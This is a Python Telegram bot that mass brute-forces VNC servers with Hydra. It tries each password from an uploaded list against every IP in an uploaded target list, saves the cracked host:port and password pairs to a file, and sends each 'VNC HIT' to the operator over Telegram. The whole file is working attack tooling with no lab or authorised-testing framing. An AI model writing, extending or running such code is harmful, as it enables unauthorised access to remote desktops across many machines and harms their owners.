#!/usr/bin/env python3
"""
VNC Checker Telegram Bot - PASSWORD-FIRST MODE
Scans by password (not by IP) for MUCH faster results!
"""

import os
import subprocess
import threading
import time
from datetime import datetime
from pathlib import Path
import asyncio
import sys
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters

# Configuration from environment variables
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '')
ADMIN_USER_ID = os.environ.get('ADMIN_USER_ID', '')

# Convert ADMIN_USER_ID to int
try:
    ADMIN_USER_ID = int(ADMIN_USER_ID) if ADMIN_USER_ID else 0
except:
    ADMIN_USER_ID = 0

# Files
IP_FILE = 'ips.txt'
PASS_FILE = 'passwords.txt'
OUTPUT_FILE = 'valid_vnc.txt'

# Global state
scan_status = {
    'running': False,
    'total_passwords': 0,
    'total_ips': 0,
    'checked_combinations': 0,
    'found': 0,
    'current_password': '',
    'current_pass_idx': 0,
    'start_time': None,
    'hits': [],
    'found_ips': set()  # Track IPs that already have passwords
}

files_status = {
    'ips_uploaded': False,
    'passwords_uploaded': False,
    'ips_count': 0,
    'passwords_count': 0
}

scan_lock = threading.Lock()

def check_hydra_installed():
    """Check if Hydra is installed"""
    try:
        result = subprocess.run(['which', 'hydra'], capture_output=True, text=True)
        return result.returncode == 0
    except:
        return False

def check_single_password_all_ips(ips, password, timeout_sec=60):
    """Check one password against all IPs at once using Hydra"""
    try:
        # Create temp file with IPs
        temp_ip_file = '/tmp/target_ips.txt'
        with open(temp_ip_file, 'w') as f:
            for ip_string in ips:
                if ':' in ip_string:
                    ip, port = ip_string.split(':')
                else:
                    ip = ip_string
                    port = '5900'
                f.write(f"vnc://{ip}:{port}\n")
        
        # Create temp password file
        temp_pass_file = '/tmp/current_pass.txt'
        with open(temp_pass_file, 'w') as f:
            f.write(password + '\n')
        
        print(f"[DEBUG] Testing password '{password}' on {len(ips)} IPs...")
        
        cmd = [
            'hydra',
            '-M', temp_ip_file,  # Multiple targets
            '-P', temp_pass_file,  # Single password
            '-t', '4',
            '-f',  # Stop on first hit per target
            'vnc'
        ]
        
        start_time = time.time()
        
        result = subprocess.run(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=timeout_sec * len(ips),  # Timeout scaled by number of IPs
            text=True
        )
        
        elapsed = time.time() - start_time
        print(f"[DEBUG] Checked {len(ips)} IPs in {elapsed:.1f}s")
        
        output = result.stdout + result.stderr
        
        # Parse hits
        hits = []
        for line in output.split('\n'):
            if '[vnc]' in line.lower() and 'host:' in line.lower():
                # Parse: [5900][vnc] host: 10.0.0.1   password: admin
                try:
                    parts = line.split('host:')[1].split()
                    if len(parts) >= 3:
                        ip = parts[0].strip()
                        found_pass = line.split('password:')[1].strip() if 'password:' in line else password
                        
                        # Extract port from beginning
                        port = '5900'
                        if '[' in line and ']' in line:
                            port_part = line[line.find('[')+1:line.find(']')]
                            if port_part.isdigit():
                                port = port_part
                        
                        hits.append({
                            'ip': ip,
                            'port': port,
                            'password': found_pass
                        })
                        print(f"[HIT] {ip}:{port} | Password: {found_pass}")
                except Exception as e:
                    print(f"[ERROR] Parsing hit: {e}")
        
        return hits
        
    except subprocess.TimeoutExpired:
        print(f"[TIMEOUT] Password '{password}' check timed out")
        return []
    except Exception as e:
        print(f"[ERROR] Checking password '{password}': {e}")
        return []

def send_message_sync(context, chat_id, message):
    """Send message synchronously from thread"""
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        loop.run_until_complete(
            context.bot.send_message(
                chat_id=chat_id,
                text=message,
                parse_mode='HTML'
            )
        )
        loop.close()
        return True
    except Exception as e:
        print(f"Error sending message: {e}")
        return False

def send_hit(context, chat_id, ip, port, password):
    """Send found credential immediately"""
    message = (
        f"🎯 <b>VNC HIT FOUND!</b>\n\n"
        f"🖥 <b>IP:</b> <code>{ip}:{port}</code>\n"
        f"🔑 <b>Password:</b> <code>{password}</code>\n"
        f"⏰ <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        f"💾 Saved to: {OUTPUT_FILE}\n"
        f"🎯 Total found: {scan_status['found']}"
    )
    send_message_sync(context, chat_id, message)

def run_scan_password_first(context, chat_id, max_passwords=None):
    """Run VNC scan - PASSWORD FIRST mode (much faster!)"""
    global scan_status
    
    with scan_lock:
        if scan_status['running']:
            return
        scan_status['running'] = True
        scan_status['start_time'] = datetime.now()
        scan_status['checked_combinations'] = 0
        scan_status['found'] = 0
        scan_status['hits'] = []
        scan_status['found_ips'] = set()
    
    try:
        send_message_sync(context, chat_id, "🔍 Loading files...")
        
        # Load IPs
        with open(IP_FILE) as f:
            all_ips = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        
        # Load passwords
        with open(PASS_FILE) as f:
            passwords = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        
        # Limit passwords in test mode
        if max_passwords:
            passwords = passwords[:max_passwords]
            test_msg = f" (TEST - First {max_passwords} passwords)"
        else:
            test_msg = ""
        
        scan_status['total_ips'] = len(all_ips)
        scan_status['total_passwords'] = len(passwords)
        
        send_message_sync(context, chat_id, f"✅ Loaded {len(all_ips)} IPs and {len(passwords)} passwords")
        
        if not check_hydra_installed():
            send_message_sync(context, chat_id, "❌ Hydra not installed!")
            scan_status['running'] = False
            return
        
        send_message_sync(context, chat_id, "✅ Hydra ready!")
        
        # Send start message
        start_msg = (
            f"🚀 <b>PASSWORD-FIRST SCAN{test_msg}</b>\n\n"
            f"📊 Total IPs: {len(all_ips)}\n"
            f"🔐 Passwords to test: {len(passwords)}\n"
            f"⚡ Mode: Test each password on ALL IPs\n"
            f"⏰ Started: {datetime.now().strftime('%H:%M:%S')}\n\n"
            f"<b>This is MUCH faster!</b> 🚀"
        )
        send_message_sync(context, chat_id, start_msg)
        
        # Initialize output file
        with open(OUTPUT_FILE, 'w') as f:
            f.write("="*70 + "\n")
            f.write("Valid VNC Servers - Password-First Scan\n")
            f.write(f"Scan started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("="*70 + "\n\n")
        
        # Test each password on ALL IPs
        for pass_idx, password in enumerate(passwords, 1):
            if not scan_status['running']:
                send_message_sync(context, chat_id, "⏹ Scan stopped!")
                break
            
            scan_status['current_password'] = password
            scan_status['current_pass_idx'] = pass_idx
            
            # Show which password we're testing
            pass_display = password if password else "(empty/no password)"
            send_message_sync(
                context, 
                chat_id,
                f"🔑 Testing password {pass_idx}/{len(passwords)}: <code>{pass_display}</code>\n"
                f"📊 Checking against {len(all_ips)} IPs..."
            )
            
            # Get IPs that don't have passwords yet
            remaining_ips = [ip for ip in all_ips if ip not in scan_status['found_ips']]
            
            if not remaining_ips:
                send_message_sync(context, chat_id, "✅ All IPs have passwords found!")
                break
            
            # Check this password on all remaining IPs
            hits = check_single_password_all_ips(remaining_ips, password, timeout_sec=60)
            
            # Process hits
            for hit in hits:
                scan_status['found'] += 1
                scan_status['hits'].append(hit)
                scan_status['found_ips'].add(f"{hit['ip']}:{hit['port']}")
                
                # Save to file
                with open(OUTPUT_FILE, 'a') as f:
                    f.write(f"{hit['ip']}:{hit['port']} | Password: {hit['password']} | Found: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.flush()
                
                # Send notification
                send_hit(context, chat_id, hit['ip'], hit['port'], hit['password'])
            
            scan_status['checked_combinations'] += len(remaining_ips)
            
            # Progress update
            if pass_idx % 5 == 0 or pass_idx == len(passwords) or len(hits) > 0:
                progress = (pass_idx / len(passwords)) * 100
                elapsed = (datetime.now() - scan_status['start_time']).total_seconds()
                
                if pass_idx > 0:
                    eta_total = (elapsed / pass_idx) * len(passwords)
                    eta_remaining = eta_total - elapsed
                    eta_str = f"{eta_remaining/60:.1f} min"
                else:
                    eta_str = "Calculating..."
                
                progress_msg = (
                    f"📊 <b>PROGRESS</b>\n\n"
                    f"🔐 Passwords tested: {pass_idx}/{len(passwords)} ({progress:.1f}%)\n"
                    f"📊 Combinations checked: {scan_status['checked_combinations']}\n"
                    f"🎯 Hits found: {scan_status['found']}\n"
                    f"⏱ Elapsed: {elapsed/60:.1f} min\n"
                    f"⏳ ETA: {eta_str}"
                )
                
                send_message_sync(context, chat_id, progress_msg)
        
        # Final summary
        elapsed = (datetime.now() - scan_status['start_time']).total_seconds()
        
        summary = (
            f"✅ <b>Scan Complete!</b>\n\n"
            f"🔐 Passwords tested: {scan_status['current_pass_idx']}/{scan_status['total_passwords']}\n"
            f"📊 IPs tested: {scan_status['total_ips']}\n"
            f"🎯 Valid found: {scan_status['found']}\n"
            f"⏱ Total time: {elapsed/60:.1f} min\n"
            f"💾 Results: {OUTPUT_FILE}"
        )
        
        if scan_status['hits']:
            summary += "\n\n<b>Found credentials:</b>\n"
            for hit in scan_status['hits'][:10]:
                summary += f"• {hit['ip']}:{hit['port']} | {hit['password']}\n"
            if len(scan_status['hits']) > 10:
                summary += f"\n...and {len(scan_status['hits']) - 10} more"
        
        send_message_sync(context, chat_id, summary)
        
    except Exception as e:
        error_msg = f"❌ <b>Scan Error!</b>\n\n{str(e)}"
        send_message_sync(context, chat_id, error_msg)
        print(f"[ERROR] Scan failed: {e}")
        import traceback
        traceback.print_exc()
    finally:
        scan_status['running'] = False

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command"""
    if update.effective_user.id != ADMIN_USER_ID:
        await update.message.reply_text("❌ Unauthorized")
        return
    
    welcome_msg = (
        "🤖 <b>VNC Checker Bot - PASSWORD FIRST</b>\n\n"
        "⚡ <b>NEW: Much faster scanning!</b>\n"
        "Tests each password on ALL IPs at once!\n\n"
        "<b>Step 1:</b> Upload IPs file (IP:PORT format)\n"
        "<b>Step 2:</b> Upload passwords file\n"
        "<b>Step 3:</b> Start scanning!\n\n"
    )
    
    # Check current status
    if files_status['ips_uploaded']:
        welcome_msg += f"✅ IPs uploaded ({files_status['ips_count']} IPs)\n"
    else:
        welcome_msg += "⏳ Waiting for IPs file...\n"
    
    if files_status['passwords_uploaded']:
        welcome_msg += f"✅ Passwords uploaded ({files_status['passwords_count']} passwords)\n"
    else:
        welcome_msg += "⏳ Waiting for passwords file...\n"
    
    keyboard = [
        [InlineKeyboardButton("📊 Status", callback_data='status')],
        [InlineKeyboardButton("🚀 Start Scan", callback_data='start_scan')],
        [InlineKeyboardButton("🧪 Test (5 passwords)", callback_data='test_scan')],
        [InlineKeyboardButton("⏹ Stop Scan", callback_data='stop_scan')],
        [InlineKeyboardButton("📥 Get Results", callback_data='get_results')],
        [InlineKeyboardButton("🗑 Clear Files", callback_data='clear_files')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(welcome_msg, reply_markup=reply_markup, parse_mode='HTML')

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle file uploads"""
    if update.effective_user.id != ADMIN_USER_ID:
        return
    
    document = update.message.document
    file_name = document.file_name.lower()
    
    # Download file
    file = await context.bot.get_file(document.file_id)
    
    # Determine file type
    if 'ip' in file_name or file_name == 'ips.txt':
        await file.download_to_drive(IP_FILE)
        
        with open(IP_FILE) as f:
            ip_count = len([line for line in f if line.strip() and not line.startswith('#')])
        
        files_status['ips_uploaded'] = True
        files_status['ips_count'] = ip_count
        
        await update.message.reply_text(
            f"✅ <b>IPs uploaded!</b>\n\n"
            f"📊 Found {ip_count} IPs\n\n"
            f"{'✅' if files_status['passwords_uploaded'] else '⏳'} Next: Upload passwords file",
            parse_mode='HTML'
        )
        
    elif 'pass' in file_name or file_name == 'passwords.txt':
        await file.download_to_drive(PASS_FILE)
        
        with open(PASS_FILE) as f:
            pass_count = len([line for line in f if line.strip() and not line.startswith('#')])
        
        files_status['passwords_uploaded'] = True
        files_status['passwords_count'] = pass_count
        
        await update.message.reply_text(
            f"✅ <b>Passwords uploaded!</b>\n\n"
            f"🔐 Found {pass_count} passwords\n\n"
            f"{'✅' if files_status['ips_uploaded'] else '⏳'} Next: Upload IPs file",
            parse_mode='HTML'
        )
    
    else:
        keyboard = [
            [InlineKeyboardButton("📋 IPs File", callback_data=f'filetype_ips_{document.file_id}')],
            [InlineKeyboardButton("🔐 Passwords File", callback_data=f'filetype_pass_{document.file_id}')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            "❓ <b>What type of file is this?</b>",
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
    
    # Check if both files uploaded
    if files_status['ips_uploaded'] and files_status['passwords_uploaded']:
        keyboard = [[InlineKeyboardButton("🚀 Start Scan Now!", callback_data='start_scan')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"🎉 <b>All files uploaded!</b>\n\n"
            f"📊 IPs: {files_status['ips_count']}\n"
            f"🔐 Passwords: {files_status['passwords_count']}\n\n"
            f"⚡ PASSWORD-FIRST MODE: Much faster!",
            reply_markup=reply_markup,
            parse_mode='HTML'
        )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button presses"""
    query = update.callback_query
    await query.answer()
    
    if query.from_user.id != ADMIN_USER_ID:
        await query.edit_message_text("❌ Unauthorized")
        return
    
    # Handle file type selection
    if query.data.startswith('filetype_'):
        parts = query.data.split('_')
        file_type = parts[1]
        file_id = parts[2]
        
        file = await context.bot.get_file(file_id)
        
        if file_type == 'ips':
            await file.download_to_drive(IP_FILE)
            with open(IP_FILE) as f:
                ip_count = len([line for line in f if line.strip() and not line.startswith('#')])
            files_status['ips_uploaded'] = True
            files_status['ips_count'] = ip_count
            await query.edit_message_text(f"✅ Saved as IPs file! ({ip_count} IPs)", parse_mode='HTML')
        else:
            await file.download_to_drive(PASS_FILE)
            with open(PASS_FILE) as f:
                pass_count = len([line for line in f if line.strip() and not line.startswith('#')])
            files_status['passwords_uploaded'] = True
            files_status['passwords_count'] = pass_count
            await query.edit_message_text(f"✅ Saved as Passwords file! ({pass_count} passwords)", parse_mode='HTML')
        return
    
    if query.data == 'status':
        if scan_status['running']:
            progress = (scan_status['current_pass_idx'] / scan_status['total_passwords'] * 100) if scan_status['total_passwords'] > 0 else 0
            elapsed = (datetime.now() - scan_status['start_time']).total_seconds()
            
            message = (
                f"📊 <b>Scan Status: RUNNING ✅</b>\n\n"
                f"🔐 Password: {scan_status['current_pass_idx']}/{scan_status['total_passwords']} ({progress:.1f}%)\n"
                f"📊 Combinations: {scan_status['checked_combinations']}\n"
                f"🎯 Found: {scan_status['found']}\n"
                f"⏱ Elapsed: {elapsed/60:.1f} min"
            )
        else:
            message = (
                f"📊 <b>Scan Status: IDLE</b>\n\n"
                f"Files:\n"
                f"{'✅' if files_status['ips_uploaded'] else '❌'} IPs: {files_status['ips_count']}\n"
                f"{'✅' if files_status['passwords_uploaded'] else '❌'} Passwords: {files_status['passwords_count']}"
            )
        
        await query.edit_message_text(message, parse_mode='HTML')
    
    elif query.data == 'start_scan':
        if scan_status['running']:
            await query.edit_message_text("⚠️ Scan already running!")
            return
        
        if not files_status['ips_uploaded'] or not files_status['passwords_uploaded']:
            await query.edit_message_text("❌ Please upload both files first!")
            return
        
        thread = threading.Thread(
            target=run_scan_password_first,
            args=(context, query.from_user.id)
        )
        thread.daemon = True
        thread.start()
        
        await query.edit_message_text(
            "🚀 <b>PASSWORD-FIRST Scan started!</b>\n\n"
            "⚡ Testing each password on ALL IPs!\n"
            "Much faster than IP-first mode! 🎯",
            parse_mode='HTML'
        )
    
    elif query.data == 'test_scan':
        if scan_status['running']:
            await query.edit_message_text("⚠️ Scan already running!")
            return
        
        if not files_status['ips_uploaded'] or not files_status['passwords_uploaded']:
            await query.edit_message_text("❌ Please upload both files first!")
            return
        
        thread = threading.Thread(
            target=run_scan_password_first,
            args=(context, query.from_user.id, 5)  # Test first 5 passwords only
        )
        thread.daemon = True
        thread.start()
        
        await query.edit_message_text(
            "🧪 <b>Test scan started!</b>\n\n"
            "Testing first 5 passwords on ALL IPs!",
            parse_mode='HTML'
        )
    
    elif query.data == 'stop_scan':
        if not scan_status['running']:
            await query.edit_message_text("⚠️ No scan running!")
            return
        
        scan_status['running'] = False
        await query.edit_message_text("⏹ Scan stopped!")
    
    elif query.data == 'get_results':
        if Path(OUTPUT_FILE).exists():
            try:
                await context.bot.send_document(
                    chat_id=query.from_user.id,
                    document=open(OUTPUT_FILE, 'rb'),
                    filename=OUTPUT_FILE,
                    caption=f'📥 VNC Results | 🎯 Found: {scan_status["found"]} credentials'
                )
                await query.edit_message_text("✅ Results sent!")
            except Exception as e:
                await query.edit_message_text(f"❌ Error: {e}")
        else:
            await query.edit_message_text("⚠️ No results yet!")
    
    elif query.data == 'clear_files':
        files_status['ips_uploaded'] = False
        files_status['passwords_uploaded'] = False
        files_status['ips_count'] = 0
        files_status['passwords_count'] = 0
        
        for f in [IP_FILE, PASS_FILE, OUTPUT_FILE]:
            if Path(f).exists():
                Path(f).unlink()
        
        await query.edit_message_text("🗑 Files cleared!", parse_mode='HTML')

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Status command"""
    if update.effective_user.id != ADMIN_USER_ID:
        return
    
    if scan_status['running']:
        progress = (scan_status['current_pass_idx'] / scan_status['total_passwords'] * 100) if scan_status['total_passwords'] > 0 else 0
        elapsed = (datetime.now() - scan_status['start_time']).total_seconds()
        
        message = (
            f"📊 <b>Scan Status</b>\n\n"
            f"🔐 Password: {scan_status['current_pass_idx']}/{scan_status['total_passwords']} ({progress:.1f}%)\n"
            f"🎯 Found: {scan_status['found']}\n"
            f"⏱ Elapsed: {elapsed/60:.1f} min"
        )
    else:
        message = "⏸ No scan running."
    
    await update.message.reply_text(message, parse_mode='HTML')

def main():
    """Start the bot"""
    print("="*60)
    print("VNC Checker Bot - PASSWORD-FIRST MODE")
    print("="*60)
    
    if not TELEGRAM_BOT_TOKEN:
        print("❌ ERROR: TELEGRAM_BOT_TOKEN not set!")
        sys.exit(1)
    
    if ADMIN_USER_ID == 0:
        print("❌ ERROR: ADMIN_USER_ID not set!")
        sys.exit(1)
    
    print(f"✅ Bot token configured")
    print(f"✅ Admin user ID: {ADMIN_USER_ID}")
    print("="*60)
    
    # Create application
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    application.add_handler(CallbackQueryHandler(button_callback))
    
    # Start bot
    print("✅ Bot started! PASSWORD-FIRST mode enabled!")
    print("="*60)
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
